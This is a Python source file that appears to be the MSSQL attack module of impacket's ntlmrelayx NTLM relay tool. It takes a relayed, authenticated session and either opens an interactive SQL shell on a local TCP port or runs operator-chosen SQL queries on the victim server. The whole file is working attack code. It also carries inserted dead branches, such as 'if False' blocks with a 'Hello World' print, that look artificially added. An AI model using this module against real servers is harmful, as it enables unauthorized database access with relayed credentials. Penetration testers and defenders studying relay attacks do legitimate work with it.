from impacket import LOG
from impacket.examples.mssqlshell import SQLSHELL
from impacket.examples.ntlmrelayx.attacks import ProtocolAttack
from impacket.examples.ntlmrelayx.utils.tcpshell import TcpShell
PROTOCOL_ATTACK_CLASS = 'MSSQLAttack'

class MSSQLAttack(ProtocolAttack):
    PLUGIN_NAMES = ['MSSQL']

    def __init__(self, config, MSSQLclient, username):
        if False:
            i = 10
            return i + 15
        ProtocolAttack.__init__(self, config, MSSQLclient, username)
        if self.config.interactive:
            self.tcp_shell = TcpShell()

    def run(self):
        if False:
            print('Hello World!')
        if self.config.interactive:
            if self.tcp_shell is not None:
                LOG.info('Started interactive MSSQL shell via TCP on 127.0.0.1:%d' % self.tcp_shell.port)
                self.tcp_shell.listen()
                mssql_shell = SQLSHELL(self.client, tcpShell=self.tcp_shell)
                mssql_shell.cmdloop()
                return
        if self.config.queries is not None:
            for query in self.config.queries:
                LOG.info('Executing SQL: %s' % query)
                try:
                    self.client.sql_query(query)
                    self.client.printReplies()
                    self.client.printRows()
                finally:
                    if self.client.lastError:
                        print(self.client.lastError)
        else:
            LOG.error('No SQL queries specified for MSSQL relay!')